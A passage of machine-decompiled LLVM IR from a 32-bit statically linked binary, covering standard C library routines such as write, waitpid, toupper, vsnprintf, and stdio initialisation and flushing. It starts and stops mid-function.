dec_label_pc_8052310:                             ; preds = %entry
  %v1_8052310 = call i32 @__errno_location(i32 %v0_80522fc)
  %v0_8052315 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052315 = sub i32 0, %v0_8052315
  %v2_8052317 = inttoptr i32 %v1_8052310 to i32*
  store i32 %v1_8052315, i32* %v2_8052317, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805231c

dec_label_pc_805231c:                             ; preds = %entry, %dec_label_pc_8052310
  %v0_805231d = phi i32 [ %v2_8052304, %entry ], [ -1, %dec_label_pc_8052310 ]
  %v2_805231c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805231c, i32* @edx, align 4
  %v2_8052320 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052320, i32* @edi, align 4
  ret i32 %v0_805231d

; uselistorder directives
  uselistorder i32 %v2_8052304, { 1, 0, 2 }
  uselistorder i32 %v0_80522fc, { 1, 0 }
  uselistorder label %dec_label_pc_805231c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8052335 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_8052335
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052340 = load i32, i32* @edi, align 4
  store i32 %v0_8052340, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052350 = load i32, i32* @ebx, align 4
  %v4_8052358 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8052350, i32* @ebx, align 4
  store i32 %v4_8052358, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052358, -4095
  br i1 %tmp, label %dec_label_pc_8052370, label %dec_label_pc_8052364

dec_label_pc_8052364:                             ; preds = %entry
  %v1_8052364 = call i32 @__errno_location(i32 %v0_8052350)
  %v0_8052369 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052369 = sub i32 0, %v0_8052369
  %v2_805236b = inttoptr i32 %v1_8052364 to i32*
  store i32 %v1_8052369, i32* %v2_805236b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052370

dec_label_pc_8052370:                             ; preds = %entry, %dec_label_pc_8052364
  %v0_8052371 = phi i32 [ %v4_8052358, %entry ], [ -1, %dec_label_pc_8052364 ]
  %v2_8052370 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052370, i32* @edx, align 4
  %v2_8052374 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052374, i32* @edi, align 4
  ret i32 %v0_8052371

; uselistorder directives
  uselistorder i32 %v4_8052358, { 1, 0, 2 }
  uselistorder i32 %v0_8052350, { 1, 0 }
  uselistorder label %dec_label_pc_8052370, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805237c = load i32, i32* inttoptr (i32 134607420 to i32*), align 4
  %v2_8052381 = mul i32 %arg1, 2
  %v3_8052381 = add i32 %v0_805237c, %v2_8052381
  %v4_8052381 = inttoptr i32 %v3_8052381 to i16*
  %v5_8052381 = load i16, i16* %v4_8052381, align 2
  %v6_8052381 = zext i16 %v5_8052381 to i32
  %v1_8052385 = and i32 %v6_8052381, 32
  ret i32 %v1_8052385
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8052390 = add i32 %arg1, 128
  %v6_805239b = icmp ugt i32 %v1_8052390, 383
  br i1 %v6_805239b, label %dec_label_pc_80523a6, label %dec_label_pc_805239d

dec_label_pc_805239d:                             ; preds = %entry
  %v0_805239d = load i32, i32* inttoptr (i32 134607428 to i32*), align 4
  %v2_80523a2 = mul i32 %arg1, 2
  %v3_80523a2 = add i32 %v0_805239d, %v2_80523a2
  %v4_80523a2 = inttoptr i32 %v3_80523a2 to i16*
  %v5_80523a2 = load i16, i16* %v4_80523a2, align 2
  %v6_80523a2 = sext i16 %v5_80523a2 to i32
  store i32 %v6_80523a2, i32* @edx, align 4
  br label %dec_label_pc_80523a6

dec_label_pc_80523a6:                             ; preds = %entry, %dec_label_pc_805239d
  %v0_80523a6 = phi i32 [ %arg1, %entry ], [ %v6_80523a2, %dec_label_pc_805239d ]
  ret i32 %v0_80523a6

; uselistorder directives
  uselistorder label %dec_label_pc_80523a6, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8065740.920 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_80523d7 = ptrtoint i32* %stack_var_16 to i32
  %v4_80523ec = inttoptr i32 %arg1 to i8*
  %v5_80523ec = call i32 @__GI_vsnprintf(i8* %v4_80523ec, i32 %arg2, i32 %arg3, i32 %v2_80523d7)
  ret i32 %v5_80523ec
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80523fb = ptrtoint i32* %stack_var_12 to i32
  %v4_805240e = inttoptr i32 %arg1 to i8*
  %v5_805240e = call i32 @__GI_vsnprintf(i8* %v4_805240e, i32 -1, i32 %arg2, i32 %v2_80523fb)
  ret i32 %v5_805240e

; uselistorder directives
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_vsnprintf, { 1, 0 }
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052418 = load i32, i32* @ebp, align 4
  %v0_8052419 = load i32, i32* @edi, align 4
  %v0_805241a = load i32, i32* @esi, align 4
  %v0_805241b = load i32, i32* @ebx, align 4
  store i32 %v0_805241b, i32* %stack_var_-16, align 4
  %v4_805241f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805241f, i32* @esi, align 4
  %v2_8052423 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_805242e = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805242e, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_8052448 = sub i32 -1, %v4_805241f
  %v1_805245b = call i32 @__stdio_init_mutex(i32 %v2_8052423)
  %v1_805246b = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_8052448, %v1_805246b
  %v5_805246d = select i1 %tmp, i32 %v1_8052448, i32 %v1_805246b
  store i32 %v5_805246d, i32* @ebx, align 4
  %v0_8052470 = load i32, i32* @esi, align 4
  %v3_805249a = inttoptr i32 %arg3 to i8*
  %v4_805249a = call i32 @_vfprintf_internal(i32 %v2_805242e, i8* %v3_805249a, i32 %arg4)
  %v1_80524a2 = icmp eq i32 %v5_805246d, 0
  store i32 %v4_805249a, i32* @edx, align 4
  br i1 %v1_80524a2, label %dec_label_pc_80524be, label %dec_label_pc_80524b7

dec_label_pc_80524b7:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_8052470 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_80524c1.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80524be

dec_label_pc_80524be:                             ; preds = %entry, %dec_label_pc_80524b7
  %v0_80524c1 = phi i32 [ %v4_805249a, %entry ], [ %v0_80524c1.pre, %dec_label_pc_80524b7 ]
  %v2_80524c3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80524c3, i32* @ebx, align 4
  store i32 %v0_805241a, i32* @esi, align 4
  store i32 %v0_8052419, i32* @edi, align 4
  store i32 %v0_8052418, i32* @ebp, align 4
  ret i32 %v0_80524c1

; uselistorder directives
  uselistorder i32 %v1_805246b, { 1, 0 }
  uselistorder i32 %v1_8052448, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_80524be, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80524c9 = load i32, i32* @edi, align 4
  %v0_80524ca = load i32, i32* @esi, align 4
  %v0_80524cb = load i32, i32* @ebx, align 4
  store i32 %v0_80524cb, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_80524d4 = call i32 @__errno_location(i32 %v0_80524cb)
  %v0_80524dc = load i16, i16* @global_var_805f2a0.917, align 32
  %v1_80524dc = zext i16 %v0_80524dc to i32
  store i32 %v1_80524dc, i32* @esi, align 4
  %v1_80524e3 = inttoptr i32 %v1_80524d4 to i32*
  %v2_80524e3 = load i32, i32* %v1_80524e3, align 4
  store i32 %v2_80524e3, i32* %ebp.global-to-local, align 4
  store i32 %v1_80524d4, i32* @edi, align 4
  %v1_80524e9 = call i32 @isatty(i32 0)
  %v0_80524ee = load i32, i32* @ebx, align 4
  %v2_80524f7 = sub i32 %v0_80524ee, %v1_80524e9
  %v2_80524fb = mul i32 %v2_80524f7, 256
  %v0_80524fe = load i32, i32* @esi, align 4
  %v2_80524fe = xor i32 %v0_80524fe, %v2_80524fb
  %v1_8052500 = trunc i32 %v2_80524fe to i16
  store i16 %v1_8052500, i16* @global_var_805f2a0.917, align 32
  %v0_8052507 = load i16, i16* @global_var_805f2f0.918, align 16
  %v1_8052507 = zext i16 %v0_8052507 to i32
  store i32 %v1_8052507, i32* @esi, align 4
  %v1_805250e = call i32 @isatty(i32 1)
  %v0_8052513 = load i32, i32* @ebx, align 4
  %v2_8052513 = sub i32 %v0_8052513, %v1_805250e
  %v2_8052515 = mul i32 %v2_8052513, 256
  %v0_8052518 = load i32, i32* @esi, align 4
  %v2_8052518 = xor i32 %v2_8052515, %v0_8052518
  %v1_805251a = trunc i32 %v2_8052518 to i16
  store i16 %v1_805251a, i16* @global_var_805f2f0.918, align 16
  %v0_8052521 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052521 = load i32, i32* @edi, align 4
  %v2_8052521 = inttoptr i32 %v1_8052521 to i32*
  store i32 %v0_8052521, i32* %v2_8052521, align 4
  %v2_8052526 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052526, i32* @ebx, align 4
  store i32 %v0_80524ca, i32* @esi, align 4
  store i32 %v0_80524c9, i32* @edi, align 4
  ret i32 %v1_805250e

; uselistorder directives
  uselistorder i32 %v1_80524d4, { 1, 0 }
  uselistorder i16* @global_var_805f2f0.918, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8052539 = inttoptr i32 %arg1 to i16*
  %v4_8052539 = call i32 @memcpy(i16* %v3_8052539, i32 ptrtoint (i32* @global_var_805db00.921 to i32), i32 24)
  ret i32 %v4_8052539
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052542 = load i32, i32* @esi, align 4
  %v0_8052543 = load i32, i32* @ebx, align 4
  store i32 %v0_8052543, i32* %stack_var_-8, align 4
  %v1_805254c = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805f260.922 to i32))
  store i32 %v1_805254c, i32* %eax.global-to-local, align 4
  %v1_8052558 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805f278.923 to i32))
  store i32 %v1_8052558, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805f25c.924 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_80525a222 = icmp eq i32 %storemerge21, 0
  %v1_80525a424 = icmp eq i1 %v1_80525a222, false
  br i1 %v1_80525a424, label %dec_label_pc_8052565.lr.ph, label %dec_label_pc_80525c2.preheader

dec_label_pc_8052565.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8052565

dec_label_pc_8052565:                             ; preds = %dec_label_pc_8052565.lr.ph, %dec_label_pc_805258c
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_8052565.lr.ph ], [ %storemerge, %dec_label_pc_805258c ]
  %v1_8052568 = add i32 %storemerge25, 56
  store i32 %v1_8052568, i32* @esi, align 4
  %v1_805256c = call i32 @__pthread_return_0(i32 %v1_8052568)
  store i32 %v1_805256c, i32* %eax.global-to-local, align 4
  %v1_8052574 = icmp eq i32 %v1_805256c, 0
  br i1 %v1_8052574, label %dec_label_pc_805258c, label %dec_label_pc_8052578

dec_label_pc_8052578:                             ; preds = %dec_label_pc_8052565
  %v0_8052578 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052578 = add i32 %v0_8052578, 8
  %v2_8052578 = inttoptr i32 %v1_8052578 to i32*
  %v3_8052578 = load i32, i32* %v2_8052578, align 4
  store i32 %v3_8052578, i32* %eax.global-to-local, align 4
  %v1_805257b = inttoptr i32 %v0_8052578 to i16*
  store i16 48, i16* %v1_805257b, align 2
  %v0_8052580 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052580 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052580 = add i32 %v1_8052580, 24
  %v3_8052580 = inttoptr i32 %v2_8052580 to i32*
  store i32 %v0_8052580, i32* %v3_8052580, align 4
  %v0_8052583 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052583 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052583 = add i32 %v1_8052583, 28
  %v3_8052583 = inttoptr i32 %v2_8052583 to i32*
  store i32 %v0_8052583, i32* %v3_8052583, align 4
  %v0_8052586 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052586 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052586 = add i32 %v1_8052586, 16
  %v3_8052586 = inttoptr i32 %v2_8052586 to i32*
  store i32 %v0_8052586, i32* %v3_8052586, align 4
  %v0_8052589 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052589 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052589 = add i32 %v1_8052589, 20
  %v3_8052589 = inttoptr i32 %v2_8052589 to i32*
  store i32 %v0_8052589, i32* %v3_8052589, align 4
  br label %dec_label_pc_805258c

dec_label_pc_805258c:                             ; preds = %dec_label_pc_8052565, %dec_label_pc_8052578
  %v0_805258f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805258f = add i32 %v0_805258f, 52
  %v2_805258f = inttoptr i32 %v1_805258f to i32*
  store i32 1, i32* %v2_805258f, align 4
  %v0_8052596 = load i32, i32* @esi, align 4
  %v1_8052597 = call i32 @__stdio_init_mutex(i32 %v0_8052596)
  store i32 %v1_8052597, i32* %eax.global-to-local, align 4
  %v0_805259c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805259c = add i32 %v0_805259c, 32
  %v2_805259c = inttoptr i32 %v1_805259c to i32*
  %storemerge = load i32, i32* %v2_805259c, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_80525a2 = icmp eq i32 %storemerge, 0
  %v1_80525a4 = icmp eq i1 %v1_80525a2, false
  br i1 %v1_80525a4, label %dec_label_pc_8052565, label %dec_label_pc_805259f.dec_label_pc_80525c2.preheader_crit_edge

dec_label_pc_805259f.dec_label_pc_80525c2.preheader_crit_edge: ; preds = %dec_label_pc_805258c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805f25c.924 to i32*), align 4
  br label %dec_label_pc_80525c2.preheader

dec_label_pc_80525c2.preheader:                   ; preds = %dec_label_pc_805259f.dec_label_pc_80525c2.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_805259f.dec_label_pc_80525c2.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_80525c23 = icmp eq i32 %storemerge12, 0
  %v1_80525c410 = icmp eq i1 %v1_80525c23, false
  br i1 %v1_80525c410, label %dec_label_pc_80525ae.preheader, label %dec_label_pc_80525c6

dec_label_pc_80525ae.preheader:                   ; preds = %dec_label_pc_80525c2.preheader
  br label %dec_label_pc_80525ae

dec_label_pc_80525ae:                             ; preds = %dec_label_pc_80525ae.preheader, %dec_label_pc_80525bf
  %v0_80525b6 = phi i32 [ %storemerge1, %dec_label_pc_80525bf ], [ %storemerge12, %dec_label_pc_80525ae.preheader ]
  %v1_80525ae = inttoptr i32 %v0_80525b6 to i8*
  %v2_80525ae = load i8, i8* %v1_80525ae, align 1
  %v3_80525ae = and i8 %v2_80525ae, 64
  %v4_80525ae = icmp eq i8 %v3_80525ae, 0
  br i1 %v4_80525ae, label %dec_label_pc_80525bf, label %dec_label_pc_80525b3

dec_label_pc_80525b3:                             ; preds = %dec_label_pc_80525ae
  %v1_80525b7 = call i32 @__stdio_wcommit(i32 %v0_80525b6)
  store i32 %v1_80525b7, i32* %eax.global-to-local, align 4
  %v0_80525bf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80525bf

dec_label_pc_80525bf:                             ; preds = %dec_label_pc_80525ae, %dec_label_pc_80525b3
  %v0_80525bf = phi i32 [ %v0_80525b6, %dec_label_pc_80525ae ], [ %v0_80525bf.pre, %dec_label_pc_80525b3 ]
  %v1_80525bf = add i32 %v0_80525bf, 32
  %v2_80525bf = inttoptr i32 %v1_80525bf to i32*
  %storemerge1 = load i32, i32* %v2_80525bf, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_80525c2 = icmp eq i32 %storemerge1, 0
  %v1_80525c4 = icmp eq i1 %v1_80525c2, false
  br i1 %v1_80525c4, label %dec_label_pc_80525ae, label %dec_label_pc_80525c6

dec_label_pc_80525c6:                             ; preds = %dec_label_pc_80525bf, %dec_label_pc_80525c2.preheader
  %v2_80525c6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80525c6, i32* %eax.global-to-local, align 4
  %v2_80525c7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80525c7, i32* @ebx, align 4
  store i32 %v0_8052542, i32* @esi, align 4
  ret i32 %v2_80525c6

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_80525bf, { 1, 0 }
  uselistorder label %dec_label_pc_80525ae, { 1, 0 }
  uselistorder label %dec_label_pc_805258c, { 1, 0 }
  uselistorder label %dec_label_pc_8052565, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_80525cc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80525d4 = add i32 %arg1, 8
  %v2_80525d4 = inttoptr i32 %v1_80525d4 to i32*
  %v3_80525d4 = load i32, i32* %v2_80525d4, align 4
  store i32 %v3_80525d4, i32* %edx.global-to-local, align 4
  %v1_80525d7 = add i32 %arg1, 16
  %v2_80525d7 = inttoptr i32 %v1_80525d7 to i32*
  %v3_80525d7 = load i32, i32* %v2_80525d7, align 4
  %v2_80525da = sub i32 %v3_80525d7, %v3_80525d4
  %v12_80525da = icmp eq i32 %v2_80525da, 0
  store i32 %v2_80525da, i32* %eax.global-to-local, align 4
  br i1 %v12_80525da, label %dec_label_pc_80525ed, label %dec_label_pc_80525de

dec_label_pc_80525de:                             ; preds = %entry
  store i32 %v3_80525d4, i32* %v2_80525d7, align 4
  %v0_80525e1 = load i32, i32* @ecx, align 4
  %v0_80525e2 = load i32, i32* %eax.global-to-local, align 4
  %v0_80525e3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80525e4 = load i32, i32* @ebx, align 4
  %v4_80525e5 = inttoptr i32 %v0_80525e4 to i16*
  %v5_80525e5 = call i32 @__stdio_WRITE(i16* %v4_80525e5, i32 %v0_80525e3, i32 %v0_80525e2, i32 %v0_80525e1)
  store i32 %v5_80525e5, i32* %eax.global-to-local, align 4
  %v0_80525ed.pre = load i32, i32* @ebx, align 4
  %v2_80525f3.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80525ed

dec_label_pc_80525ed:                             ; preds = %entry, %dec_label_pc_80525de
  %v2_80525f3 = phi i32 [ %tmp11, %entry ], [ %v2_80525f3.pre, %dec_label_pc_80525de ]
  %v0_80525ed = phi i32 [ %arg1, %entry ], [ %v0_80525ed.pre, %dec_label_pc_80525de ]
  %v1_80525ed = add i32 %v0_80525ed, 16
  %v2_80525ed = inttoptr i32 %v1_80525ed to i32*
  %v3_80525ed = load i32, i32* %v2_80525ed, align 4
  store i32 %v3_80525ed, i32* %eax.global-to-local, align 4
  %v2_80525f0 = add i32 %v0_80525ed, 8
  %v3_80525f0 = inttoptr i32 %v2_80525f0 to i32*
  %v4_80525f0 = load i32, i32* %v3_80525f0, align 4
  %v5_80525f0 = sub i32 %v3_80525ed, %v4_80525f0
  store i32 %v5_80525f0, i32* %eax.global-to-local, align 4
  store i32 %v2_80525f3, i32* @edx, align 4
  store i32 %v0_80525cc, i32* @ebx, align 4
  ret i32 %v5_80525f0

; uselistorder directives
  uselistorder i32 %v0_80525ed, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80525ed, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v12_80525fb = ptrtoint i32* %stack_var_-28 to i32
  %v4_80525fe = ptrtoint i16* %arg1 to i32
  store i32 %v4_80525fe, i32* @esi, align 4
  %v1_8052602 = add i32 %v4_80525fe, 52
  %v2_8052602 = inttoptr i32 %v1_8052602 to i32*
  %v3_8052602 = load i32, i32* %v2_8052602, align 4
  store i32 %v3_8052602, i32* @edi, align 4
  %v1_8052605 = icmp eq i32 %v3_8052602, 0
  %v1_8052607 = icmp eq i1 %v1_8052605, false
  br i1 %v1_8052607, label %dec_label_pc_8052628, label %dec_label_pc_8052609

dec_label_pc_8052609:                             ; preds = %entry
  %v1_8052609 = add i32 %v4_80525fe, 56
  store i32 %v1_8052609, i32* @ebx, align 4
  store i32 %v12_80525fb, i32* @eax, align 4
  %v3_8052618 = call i32 @__pthread_return_void(i32 %v12_80525fb, i32 134567199)
  %v0_805261d = load i32, i32* @ebx, align 4
  %v2_8052620 = call i32 @__pthread_return_0(i32 %v0_805261d)
  %v0_8052628.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052628

dec_label_pc_8052628:                             ; preds = %entry, %dec_label_pc_8052609
  %v0_8052641 = phi i32 [ %v4_80525fe, %entry ], [ %v0_8052628.pre, %dec_label_pc_8052609 ]
  %v1_8052628 = inttoptr i32 %v0_8052641 to i16*
  %v2_8052628 = load i16, i16* %v1_8052628, align 2
  %v1_805262b = and i16 %v2_8052628, 192
  %v6_8052630 = icmp eq i16 %v1_805262b, 192
  br i1 %v6_8052630, label %dec_label_pc_8052628.dec_label_pc_805264e_crit_edge, label %dec_label_pc_8052637

dec_label_pc_8052628.dec_label_pc_805264e_crit_edge: ; preds = %dec_label_pc_8052628
  br label %dec_label_pc_805264e

dec_label_pc_8052637:                             ; preds = %dec_label_pc_8052628
  %v0_8052637 = load i32, i32* @ecx, align 4
  store i32 -1, i32* @ebx, align 4
  %v6_8052642 = call i32 @__stdio_trans2w_o(i16* %v1_8052628, i32 128, i32 %v0_8052637, i32 %v0_8052637)
  %v1_805264a = icmp eq i32 %v6_8052642, 0
  %v1_805264c = icmp eq i1 %v1_805264a, false
  br i1 %v1_805264c, label %dec_label_pc_8052662, label %dec_label_pc_8052637.dec_label_pc_805264e_crit_edge

dec_label_pc_8052637.dec_label_pc_805264e_crit_edge: ; preds = %dec_label_pc_8052637
  %v0_8052657.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805264e

dec_label_pc_805264e:                             ; preds = %dec_label_pc_8052628.dec_label_pc_805264e_crit_edge, %dec_label_pc_8052637.dec_label_pc_805264e_crit_edge
  %v0_8052657 = phi i32 [ %v0_8052641, %dec_label_pc_8052628.dec_label_pc_805264e_crit_edge ], [ %v0_8052657.pre, %dec_label_pc_8052637.dec_label_pc_805264e_crit_edge ]
  %v4_8052658 = inttoptr i32 %arg2 to i8*
  %v5_8052658 = call i32 @_vfprintf_internal(i32 %v0_8052657, i8* %v4_8052658, i32 %arg3)
  store i32 %v5_8052658, i32* @ebx, align 4
  br label %dec_label_pc_8052662

dec_label_pc_8052662:                             ; preds = %dec_label_pc_8052637, %dec_label_pc_805264e
  br i1 %v1_8052607, label %dec_label_pc_8052677, label %dec_label_pc_8052666

dec_label_pc_8052666:                             ; preds = %dec_label_pc_8052662
  store i32 %v12_80525fb, i32* @eax, align 4
  %v3_805266f = call i32 @__pthread_return_void(i32 %v12_80525fb, i32 1)
  br label %dec_label_pc_8052677

dec_label_pc_8052677:                             ; preds = %dec_label_pc_8052662, %dec_label_pc_8052666
  %v0_805267a = load i32, i32* @ebx, align 4
  ret i32 %v0_805267a

; uselistorder directives
  uselistorder i32 %v12_80525fb, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_8052677, { 1, 0 }
  uselistorder label %dec_label_pc_8052662, { 1, 0 }
  uselistorder label %dec_label_pc_805264e, { 1, 0 }
  uselistorder label %dec_label_pc_8052628, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8052680 = load i32, i32* @edi, align 4
  %v0_8052681 = load i32, i32* @eax, align 4
  store i32 %v0_8052681, i32* @edi, align 4
  %v0_8052683 = load i32, i32* @esi, align 4
  %v0_8052684 = load i32, i32* @ecx, align 4
  store i32 %v0_8052684, i32* @esi, align 4
  %v0_8052686 = load i32, i32* @ebx, align 4
  store i32 %v0_8052684, i32* @ebx, align 4
  %v0_805268c = load i32, i32* @edx, align 4
  store i32 %v0_805268c, i32* %stack_var_-13, align 4
  %v1_80526932 = icmp eq i32 %v0_8052684, 0
  br i1 %v1_80526932, label %dec_label_pc_80526ab, label %dec_label_pc_8052697.lr.ph

dec_label_pc_8052697.lr.ph:                       ; preds = %entry
  %v2_8052697 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_8052697

dec_label_pc_8052692:                             ; preds = %dec_label_pc_8052697
  %v1_8052692 = add i32 %v0_8052692, -1
  %v8_8052692 = icmp eq i32 %v1_8052692, 0
  store i32 %v1_8052692, i32* @ebx, align 4
  br i1 %v8_8052692, label %dec_label_pc_80526ab.loopexit, label %dec_label_pc_8052692.dec_label_pc_8052697_crit_edge

dec_label_pc_8052692.dec_label_pc_8052697_crit_edge: ; preds = %dec_label_pc_8052692
  %v0_805269b.pre = load i32, i32* @edx, align 4
  %v0_805269c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052697

dec_label_pc_8052697:                             ; preds = %dec_label_pc_8052692.dec_label_pc_8052697_crit_edge, %dec_label_pc_8052697.lr.ph
  %v0_805269c = phi i32 [ %v0_805269c.pre, %dec_label_pc_8052692.dec_label_pc_8052697_crit_edge ], [ %v0_8052681, %dec_label_pc_8052697.lr.ph ]
  %v0_805269b = phi i32 [ %v0_805269b.pre, %dec_label_pc_8052692.dec_label_pc_8052697_crit_edge ], [ %v0_805268c, %dec_label_pc_8052697.lr.ph ]
  %v4_80526a0 = call i32 @__stdio_fwrite(i32 %v2_8052697, i32 1, i32 %v0_805269c, i32 %v0_805269b)
  %v8_80526a8 = icmp eq i32 %v4_80526a0, 1
  %v0_8052692 = load i32, i32* @ebx, align 4
  br i1 %v8_80526a8, label %dec_label_pc_8052692, label %dec_label_pc_80526ab.loopexit

dec_label_pc_80526ab.loopexit:                    ; preds = %dec_label_pc_8052692, %dec_label_pc_8052697
  %v1_80526ae.ph = phi i32 [ %v0_8052692, %dec_label_pc_8052697 ], [ 0, %dec_label_pc_8052692 ]
  %v0_80526ae.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80526ab

dec_label_pc_80526ab:                             ; preds = %dec_label_pc_80526ab.loopexit, %entry
  %v0_80526ae = phi i32 [ 0, %entry ], [ %v0_80526ae.pre, %dec_label_pc_80526ab.loopexit ]
  %v1_80526ae = phi i32 [ 0, %entry ], [ %v1_80526ae.ph, %dec_label_pc_80526ab.loopexit ]
  %v2_80526ae = sub i32 %v0_80526ae, %v1_80526ae
  store i32 %v0_8052686, i32* @ebx, align 4
  store i32 %v0_8052683, i32* @esi, align 4
  store i32 %v0_8052680, i32* @edi, align 4
  ret i32 %v2_80526ae

; uselistorder directives
  uselistorder i32 %v1_8052692, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_80526ab.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
